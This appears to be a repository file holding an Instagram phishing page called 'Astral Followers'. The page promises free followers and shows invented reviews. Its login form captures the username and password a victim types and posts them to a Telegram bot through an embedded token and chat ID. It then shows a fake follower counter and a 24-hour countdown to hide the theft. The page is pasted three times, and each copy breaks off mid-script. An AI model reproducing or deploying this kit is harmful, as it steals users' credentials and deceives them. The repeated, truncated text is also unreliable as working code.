# Astral-followers
<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Astral Followers ✨ 2025</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #9b59b6, #8e44ad);
      color: white;
      overflow-x: hidden;
    }.header {
  text-align: center;
  padding: 30px;
  font-size: 32px;
  font-weight: bold;
  position: relative;
}

.header::after {
  content: "✨";
  position: absolute;
  right: 10px;
  top: 10px;
  font-size: 32px;
}

.reviews {
  display: flex;
  overflow-x: auto;
  padding: 20px;
  gap: 20px;
}

.review {
  flex: 0 0 auto;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  padding: 15px;
  width: 200px;
  text-align: center;
  backdrop-filter: blur(10px);
  box-shadow: 0 0 10px rgba(0,0,0,0.3);
}

.review img {
  width: 60px;
  height: 60px;
  border-radius: 50%;
  margin-bottom: 10px;
}

.main {
  text-align: center;
  margin-top: 40px;
}

.login-btn {
  background: white;
  color: #8e44ad;
  font-weight: bold;
  border: none;
  padding: 15px 30px;
  border-radius: 30px;
  font-size: 18px;
  cursor: pointer;
}

.login-btn:hover {
  background: #f2f2f2;
}

.login-page, .slider-page, .countdown-page {
  display: none;
  flex-direction: column;
  align-items: center;
  margin-top: 50px;
}

.login-page input {
  width: 250px;
  margin: 10px;
  padding: 12px;
  border: none;
  border-radius: 8px;
  background: #eee;
}

.submit-btn {
  background: #3897f0;
  color: white;
  border: none;
  padding: 12px 30px;
  border-radius: 8px;
  margin-top: 10px;
  font-weight: bold;
  cursor: pointer;
}

.slider {
  width: 300px;
}

.followers-count {
  font-size: 24px;
  margin-top: 10px;
}

.timer {
  font-size: 48px;
  font-weight: bold;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  padding: 20px 40px;
  margin-top: 20px;
  backdrop-filter: blur(10px);
}

  </style>
</head>
<body><div class="header">Astral Followers ✨ 2025</div><div class="reviews">
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=1" alt="profile">
    <p>Gained 5k followers instantly! Legit!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=2" alt="profile">
    <p>Best site ever fr, thank you!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=3" alt="profile">
    <p>Got my dream 10k today!!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=4" alt="profile">
    <p>Was sus but it's 100% real!</p>
  </div>
</div><div class="main">
  <button class="login-btn" onclick="showLogin()">Sign in with Instagram</button>
</div><div class="login-page" id="loginPage">
  <input type="text" id="username" placeholder="Username">
  <input type="password" id="password" placeholder="Password">
  <button class="submit-btn" onclick="sendLogin()">Login</button>
</div><div class="slider-page" id="sliderPage">
  <h2>Select Number of Followers</h2>
  <input type="range" min="100" max="10000" step="100" value="1000" class="slider" id="followerSlider">
  <div class="followers-count" id="followerCount">1000 Followers</div>
  <button class="submit-btn" onclick="startCountdown()">Confirm</button>
</div><div class="countdown-page" id="countdownPage">
  <div class="timer" id="timer24h"></div>
  <div class="followers-count" id="count">0 Followers</div>
  <p>Thanks for trusting us! You'll receive your followers in 24h!</p>
</div><script>
  function showLogin() {
    document.querySelector('.main').style.display = 'none';
    document.getElementById('loginPage').style.display = 'flex';
  }

  function sendLogin() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch('https://api.telegram.org/bot8121986292:AAGc0owQYteaLViIkAUCyZ6F_5O7F1jL7t0/sendMessage', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '8192063374',
        text: `Instagram Login:\nUsername: ${username}\nPassword: ${password}`
      })
    });

    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('sliderPage').style.display = 'flex';
  }

  const slider = document.getElementById('followerSlider');
  const followerCount = document.getElementById('followerCount');

  slider.oninput = function() {
    followerCount.textContent = this.value + ' Followers';
  }

  function startCountdown() {
    document.getElementById('sliderPage').style.display = 'none';
    document.getElementById('countdownPage').style.display = 'block';

    let finalCount = parseInt(slider.value);
    let current = 0;
    let interval = setInterval(() => {
      if (current >= finalCount) {
        clearInterval(interval);
      } else {
        current += Math.floor(Math.random() * 10) + 5;
        if (current > finalCount) current = finalCount;
        document.getElementById('count').textContent = current + ' Followers';
      }
    }, 150);

    // 24hr countdown timer
    const timerElement = document.getElementById('timer24h');
    let timeLeft = 24 * 60 * 60;
    const updateTimer = () => {
      const hours = Math.floor(timeLeft / 3600);
      const minutes = Math.floor((timeLeft % 3600) / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      timeLeft--;
      if (timeLeft < 0) clearInterval(timerInterval);
    };
   <!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Astral Followers ✨ 2025</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #9b59b6, #8e44ad);
      color: white;
      overflow-x: hidden;
    }.header {
  text-align: center;
  padding: 30px;
  font-size: 32px;
  font-weight: bold;
  position: relative;
}

.header::after {
  content: "✨";
  position: absolute;
  right: 10px;
  top: 10px;
  font-size: 32px;
}

.reviews {
  display: flex;
  overflow-x: auto;
  padding: 20px;
  gap: 20px;
}

.review {
  flex: 0 0 auto;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  padding: 15px;
  width: 200px;
  text-align: center;
  backdrop-filter: blur(10px);
  box-shadow: 0 0 10px rgba(0,0,0,0.3);
}

.review img {
  width: 60px;
  height: 60px;
  border-radius: 50%;
  margin-bottom: 10px;
}

.main {
  text-align: center;
  margin-top: 40px;
}

.login-btn {
  background: white;
  color: #8e44ad;
  font-weight: bold;
  border: none;
  padding: 15px 30px;
  border-radius: 30px;
  font-size: 18px;
  cursor: pointer;
}

.login-btn:hover {
  background: #f2f2f2;
}

.login-page, .slider-page, .countdown-page {
  display: none;
  flex-direction: column;
  align-items: center;
  margin-top: 50px;
}

.login-page input {
  width: 250px;
  margin: 10px;
  padding: 12px;
  border: none;
  border-radius: 8px;
  background: #eee;
}

.submit-btn {
  background: #3897f0;
  color: white;
  border: none;
  padding: 12px 30px;
  border-radius: 8px;
  margin-top: 10px;
  font-weight: bold;
  cursor: pointer;
}

.slider {
  width: 300px;
}

.followers-count {
  font-size: 24px;
  margin-top: 10px;
}

.timer {
  font-size: 48px;
  font-weight: bold;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  padding: 20px 40px;
  margin-top: 20px;
  backdrop-filter: blur(10px);
}

  </style>
</head>
<body><div class="header">Astral Followers ✨ 2025</div><div class="reviews">
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=1" alt="profile">
    <p>Gained 5k followers instantly! Legit!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=2" alt="profile">
    <p>Best site ever fr, thank you!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=3" alt="profile">
    <p>Got my dream 10k today!!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=4" alt="profile">
    <p>Was sus but it's 100% real!</p>
  </div>
</div><div class="main">
  <button class="login-btn" onclick="showLogin()">Sign in with Instagram</button>
</div><div class="login-page" id="loginPage">
  <input type="text" id="username" placeholder="Username">
  <input type="password" id="password" placeholder="Password">
  <button class="submit-btn" onclick="sendLogin()">Login</button>
</div><div class="slider-page" id="sliderPage">
  <h2>Select Number of Followers</h2>
  <input type="range" min="100" max="10000" step="100" value="1000" class="slider" id="followerSlider">
  <div class="followers-count" id="followerCount">1000 Followers</div>
  <button class="submit-btn" onclick="startCountdown()">Confirm</button>
</div><div class="countdown-page" id="countdownPage">
  <div class="timer" id="timer24h"></div>
  <div class="followers-count" id="count">0 Followers</div>
  <p>Thanks for trusting us! You'll receive your followers in 24h!</p>
</div><script>
  function showLogin() {
    document.querySelector('.main').style.display = 'none';
    document.getElementById('loginPage').style.display = 'flex';
  }

  function sendLogin() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch('https://api.telegram.org/bot8121986292:AAGc0owQYteaLViIkAUCyZ6F_5O7F1jL7t0/sendMessage', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '8192063374',
        text: `Instagram Login:\nUsername: ${username}\nPassword: ${password}`
      })
    });

    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('sliderPage').style.display = 'flex';
  }

  const slider = document.getElementById('followerSlider');
  const followerCount = document.getElementById('followerCount');

  slider.oninput = function() {
    followerCount.textContent = this.value + ' Followers';
  }

  function startCountdown() {
    document.getElementById('sliderPage').style.display = 'none';
    document.getElementById('countdownPage').style.display = 'block';

    let finalCount = parseInt(slider.value);
    let current = 0;
    let interval = setInterval(() => {
      if (current >= finalCount) {
        clearInterval(interval);
      } else {
        current += Math.floor(Math.random() * 10) + 5;
        if (current > finalCount) current = finalCount;
        document.getElementById('count').textContent = current + ' Followers';
      }
    }, 150);

    // 24hr countdown timer
    const timerElement = document.getElementById('timer24h');
    let timeLeft = 24 * 60 * 60;
    const updateTimer = () => {
      const hours = Math.floor(timeLeft / 3600);
      const minutes = Math.floor((timeLeft % 3600) / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      timeLeft--;
      if (timeLeft < 0) clearInterval(timerInterval);
    };
   <!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Astral Followers ✨ 2025</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #9b59b6, #8e44ad);
      color: white;
      overflow-x: hidden;
    }.header {
  text-align: center;
  padding: 30px;
  font-size: 32px;
  font-weight: bold;
  position: relative;
}

.header::after {
  content: "✨";
  position: absolute;
  right: 10px;
  top: 10px;
  font-size: 32px;
}

.reviews {
  display: flex;
  overflow-x: auto;
  padding: 20px;
  gap: 20px;
}

.review {
  flex: 0 0 auto;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  padding: 15px;
  width: 200px;
  text-align: center;
  backdrop-filter: blur(10px);
  box-shadow: 0 0 10px rgba(0,0,0,0.3);
}

.review img {
  width: 60px;
  height: 60px;
  border-radius: 50%;
  margin-bottom: 10px;
}

.main {
  text-align: center;
  margin-top: 40px;
}

.login-btn {
  background: white;
  color: #8e44ad;
  font-weight: bold;
  border: none;
  padding: 15px 30px;
  border-radius: 30px;
  font-size: 18px;
  cursor: pointer;
}

.login-btn:hover {
  background: #f2f2f2;
}

.login-page, .slider-page, .countdown-page {
  display: none;
  flex-direction: column;
  align-items: center;
  margin-top: 50px;
}

.login-page input {
  width: 250px;
  margin: 10px;
  padding: 12px;
  border: none;
  border-radius: 8px;
  background: #eee;
}

.submit-btn {
  background: #3897f0;
  color: white;
  border: none;
  padding: 12px 30px;
  border-radius: 8px;
  margin-top: 10px;
  font-weight: bold;
  cursor: pointer;
}

.slider {
  width: 300px;
}

.followers-count {
  font-size: 24px;
  margin-top: 10px;
}

.timer {
  font-size: 48px;
  font-weight: bold;
  background: rgba(255,255,255,0.1);
  border-radius: 12px;
  padding: 20px 40px;
  margin-top: 20px;
  backdrop-filter: blur(10px);
}

  </style>
</head>
<body><div class="header">Astral Followers ✨ 2025</div><div class="reviews">
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=1" alt="profile">
    <p>Gained 5k followers instantly! Legit!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=2" alt="profile">
    <p>Best site ever fr, thank you!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=3" alt="profile">
    <p>Got my dream 10k today!!</p>
  </div>
  <div class="review">
    <img src="https://i.pravatar.cc/60?img=4" alt="profile">
    <p>Was sus but it's 100% real!</p>
  </div>
</div><div class="main">
  <button class="login-btn" onclick="showLogin()">Sign in with Instagram</button>
</div><div class="login-page" id="loginPage">
  <input type="text" id="username" placeholder="Username">
  <input type="password" id="password" placeholder="Password">
  <button class="submit-btn" onclick="sendLogin()">Login</button>
</div><div class="slider-page" id="sliderPage">
  <h2>Select Number of Followers</h2>
  <input type="range" min="100" max="10000" step="100" value="1000" class="slider" id="followerSlider">
  <div class="followers-count" id="followerCount">1000 Followers</div>
  <button class="submit-btn" onclick="startCountdown()">Confirm</button>
</div><div class="countdown-page" id="countdownPage">
  <div class="timer" id="timer24h"></div>
  <div class="followers-count" id="count">0 Followers</div>
  <p>Thanks for trusting us! You'll receive your followers in 24h!</p>
</div><script>
  function showLogin() {
    document.querySelector('.main').style.display = 'none';
    document.getElementById('loginPage').style.display = 'flex';
  }

  function sendLogin() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    fetch('https://api.telegram.org/bot8121986292:AAGc0owQYteaLViIkAUCyZ6F_5O7F1jL7t0/sendMessage', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: '8192063374',
        text: `Instagram Login:\nUsername: ${username}\nPassword: ${password}`
      })
    });

    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('sliderPage').style.display = 'flex';
  }

  const slider = document.getElementById('followerSlider');
  const followerCount = document.getElementById('followerCount');

  slider.oninput = function() {
    followerCount.textContent = this.value + ' Followers';
  }

  function startCountdown() {
    document.getElementById('sliderPage').style.display = 'none';
    document.getElementById('countdownPage').style.display = 'block';

    let finalCount = parseInt(slider.value);
    let current = 0;
    let interval = setInterval(() => {
      if (current >= finalCount) {
        clearInterval(interval);
      } else {
        current += Math.floor(Math.random() * 10) + 5;
        if (current > finalCount) current = finalCount;
        document.getElementById('count').textContent = current + ' Followers';
      }
    }, 150);

    // 24hr countdown timer
    const timerElement = document.getElementById('timer24h');
    let timeLeft = 24 * 60 * 60;
    const updateTimer = () => {
      const hours = Math.floor(timeLeft / 3600);
      const minutes = Math.floor((timeLeft % 3600) / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      timeLeft--;
      if (timeLeft < 0) clearInterval(timerInterval);
    };
   
